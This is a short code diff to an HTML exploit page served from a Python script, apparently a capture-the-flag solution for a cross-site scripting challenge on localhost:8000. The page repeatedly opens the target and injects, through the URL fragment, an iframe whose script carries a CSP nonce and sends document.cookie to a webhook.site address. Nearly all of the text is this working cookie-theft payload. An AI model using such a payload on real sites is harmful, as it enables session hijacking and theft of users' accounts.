@@ -248,24 +248,21 @@ while cli := serv.accept():
 
 <script>
 
+const html = `<iframe srcdoc="<script nonce={nowy_nonce_na_pewno}>location='https://webhook.site/0c5ff6b3-f7e9-4491-b7c2-03783e8b3c69/?c='+document.cookie</scr`+`ipt>"></iframe>`
+
 const sleep = d => new Promise(r => setTimeout(r, d));
 
 window.onload = async () => {{
     for(i=0;i<20;i++){{
-
-    const xy =   window.open('http://localhost:8000/');
-    await sleep(100);
-    xy.location = 'http://localhost:8000/#%3Ciframe%20srcdoc%3D%22%3Cscript%20nonce%3D{nowy_nonce_na_pewno}%3Elocation%3D%60https%3A%2F%2Fwebhook.site%2F9583f51e-2a4d-4ad1-80e5-60f6fee1a3f6%2F%3Fc%3D%60%2Bdocument.cookie%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E';
-              
-    
+        const xy = window.open('http://localhost:8000/');
+        await sleep(100);
+        xy.location = 'http://localhost:8000/#'+encodeURIComponent(html);
     }}
 }}
 
 </script>
 </head>
-
     <body>
-
     </body>
 </html>
 '''.encode()
